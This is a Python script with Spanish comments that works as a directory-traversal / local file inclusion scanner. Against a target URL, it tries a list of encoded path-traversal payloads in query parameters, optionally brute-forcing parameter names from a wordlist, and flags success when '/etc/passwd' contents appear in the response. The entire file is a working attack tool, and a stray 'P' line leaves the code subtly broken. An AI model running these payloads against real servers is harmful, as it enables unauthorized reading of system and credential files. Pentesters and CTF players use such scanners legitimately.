''#!/usr/bin/env python3


# Author: TLuisillo_o
import argparse
import requests
from urllib.parse import urljoin
from colorama import init, Fore, Style
from tqdm import tqdm  

def main():
    init(autoreset=True)  

    # Args
    parser = argparse.ArgumentParser(description='Procesar una URL y buscar opciones válidas.')
    parser.add_argument('base_url', type=str, help='La URL base a procesar')
    parser.add_argument('-p', '--parametro', type=str, help='El nombre del parámetro que quieres probar')
    parser.add_argument('-w', '--diccionario', type=str, help='Archivo de diccionario para iterar como nombres de parámetros')
    
    args = parser.parse_args()
    base_url = args.base_url
    parametro = args.parametro
    diccionario = args.diccionario
    
    # Validar la URL base
    try:
        response = requests.get(base_url)
        response.raise_for_status()  
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Error al conectar con la URL base '{base_url}': {e}{Style.RESET_ALL}")
        return
    
    if parametro:
        # Opción 1: Conocemos el parámetro
        procesar_con_parametro(base_url, parametro)
    elif diccionario:
        # Opción 2: Iterar sobre el diccionario de palabras
        try:
            with open(diccionario, 'r') as file:
                palabras = [line.strip() for line in file.readlines()]
            
            opcion_encontrada = False
            for palabra in tqdm(palabras, desc="Iterando diccionario", unit=" palabra"):
                if procesar_sin_parametro(base_url, palabra):
                    opcion_encontrada = True
                    break
            
            if not opcion_encontrada:
                print(f"{Fore.RED}No se encontró ninguna opción válida que devolviera el contenido de /etc/passwd para la URL '{base_url}'.{Style.RESET_ALL}")
        
        except FileNotFoundError:
            print(f"{Fore.RED}El archivo de diccionario '{diccionario}' no existe.{Style.RESET_ALL}")
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Saliendo...{Style.RESET_ALL}")
            return
    else:
        print(f"{Fore.RED}Debe especificar al menos una opción: 'parametro' o 'diccionario'.{Style.RESET_ALL}")

def procesar_con_parametro(base_url, parametro):
    opciones = [
        "../../../../../../../etc/passwd",
        "....//....//....//....//....//....//....//etc/passwd",
        "....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd",
        "../../../../../../../etc/passwd%00",
        "..///////..////..//////etc/passwd",
        "/var/www/../../../etc/passwd",
        "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
        "..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "%252e%252e%252e%252e%252e%252e%252e%252e%252fetc%252fpasswd",
        "%252e%252e%252e%252e%252e%252e%252e%252e%252fetc%252fpasswd%00"
    ]
    
    P
    for opcion in opciones:
        url = urljoin(base_url, f"?{parametro}={opcion}")
        try:
            response = requests.get(url)
            
            
            if "root:x:0:0:root" in response.text:
                print(f"{Fore.GREEN}[+] ¡Opción válida encontrada!{Style.RESET_ALL}\n{Fore.CYAN}\n[*] URL probada: {url}{Style.RESET_ALL}")
                return True  
            
        except requests.exceptions.RequestException as e:
            print(f"{Fore.YELLOW}Error al realizar la solicitud HTTP para la URL {url}: {e}{Style.RESET_ALL}")
    
    
    return False

def procesar_sin_parametro(base_url, palabra):
    opciones = [
        "../../../../../../../etc/passwd",
        "....//....//....//....//....//....//....//etc/passwd"        
    ]
    
    
    for opcion in opciones:
        url = urljoin(base_url, f"?{palabra}={opcion}")
        try:
            response = requests.get(url)
            
            
            if "root:x:0:0:root" in response.text:
                print(f"{Fore.GREEN}[+] ¡Se encontró el parámetro válido '{palabra}'!{Style.RESET_ALL}\n{Fore.CYAN}\n[*] URL probada: {url}{Style.RESET_ALL}")
                return True  
            
        except requests.exceptions.RequestException as e:
            print(f"{Fore.YELLOW}Error al realizar la solicitud HTTP para la URL {url}: {e}{Style.RESET_ALL}")
    
   
    return False

if __name__ == '__main__':
    main()
